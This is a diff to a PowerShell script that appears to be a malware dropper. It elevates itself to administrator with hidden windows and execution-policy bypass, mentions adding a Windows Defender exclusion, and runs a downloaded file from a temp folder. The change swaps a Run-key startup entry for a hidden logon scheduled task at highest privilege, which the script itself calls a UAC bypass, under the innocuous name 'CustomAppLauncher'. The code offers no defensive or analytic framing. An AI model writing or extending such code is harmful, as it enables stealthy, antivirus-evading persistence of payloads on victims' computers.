@@ -11,9 +11,9 @@ function Write-Log {
     Add-Content -Path "$env:TEMP\runner.log" -Value "[$timestamp] $Message" -ErrorAction SilentlyContinue
 }
 
-# Check for admin privileges and elevate if needed (mandatory for Defender exclusion)
+# Check for admin privileges and elevate if needed (mandatory for Defender exclusion and scheduled task)
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Log "Elevating to admin privileges (required for Defender exclusion)..."
+    Write-Log "Elevating to admin privileges (required for Defender exclusion and scheduled task)..."
     $expandedTemp = [System.Environment]::ExpandEnvironmentVariables($OriginalTemp)
     $elevatedCommand = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`" -OriginalTemp `"$expandedTemp`" -FileName `"$FileName`" -RepoUrl `"$RepoUrl`""
     try {
@@ -22,7 +22,7 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     }
     catch {
         Write-Log "Failed to elevate privileges: $_"
-        throw "Admin elevation failed. Defender exclusion requires admin rights."
+        throw "Admin elevation failed. Defender exclusion and scheduled task require admin rights."
     }
 }
 
@@ -73,13 +73,20 @@ try {
     if (Test-Path $output) {
         Write-Log "File present at: $output"
 
-        # Add to startup via HKCU Registry (no admin needed for this)
-        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-        $regName = "CustomAppLauncher"
-        $regValue = "`"$output`""
-        if (-not (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
-            Write-Log "Adding to startup via HKCU Registry: $regName"
-            New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null
+        # Add to startup via Scheduled Task (UAC bypass, requires admin for initial setup)
+        if (-not (Get-ScheduledTask -TaskName "CustomAppLauncher" -ErrorAction SilentlyContinue)) {
+            Write-Log "Creating scheduled task for startup..."
+            try {
+                $action = New-ScheduledTaskAction -Execute $output
+                $trigger = New-ScheduledTaskTrigger -AtLogOn
+                $settings = New-ScheduledTaskSettingsSet -Hidden -RunOnlyIfIdle:$false -IdleDuration "00:00:00" -IdleWaitTimeout "00:00:00"
+                Register-ScheduledTask -TaskName "CustomAppLauncher" -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force | Out-Null
+                Write-Log "Scheduled task created successfully."
+            }
+            catch {
+                Write-Log "Failed to create scheduled task: $_"
+                throw "Scheduled task creation failed."
+            }
         }
 
         # Execute immediately
